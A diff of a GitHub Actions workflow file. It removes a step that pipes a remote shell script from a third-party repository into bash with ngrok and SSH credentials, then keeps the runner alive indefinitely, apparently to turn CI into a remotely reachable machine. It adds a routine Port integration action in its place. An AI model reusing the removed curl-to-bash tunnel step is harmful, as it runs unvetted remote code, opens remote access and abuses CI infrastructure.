@@ -18,12 +18,20 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v2
 
-    - name: Create Tunnel Ngrok Vps
-      env:
-        NGROK_API: ${{ github.event.inputs.NGROK_API }}
-        SSH_USERNAME: ${{ github.event.inputs.SSH_USERNAME }}
-        SSH_PASSWORD: ${{ github.event.inputs.SSH_PASSWORD }}
-      run: curl -sL https://raw.githubusercontent.com/V1HyperBot/add-vps/main/add-user.sh | bash -s $NGROK_API 1964437366 $SSH_USERNAME $SSH_PASSWORD
-
-    - name: Keep Online
-      run: sleep infinity 
+    - uses: port-labs/port-github-action@v1
+      with:
+       clientId: ${{ secrets.CLIENT_ID }}
+       clientSecret: ${{ secrets.CLIENT_SECRET }}
+       operation: UPSERT
+       identifier: port-github-action
+       title: Port Github Action
+       blueprint: PortIntegration
+       properties: |
+         {
+           "version": "v1"
+         }
+       team: '["Port"]'
+       relations: |
+         {
+           "deployedAt": "prod"
+         }
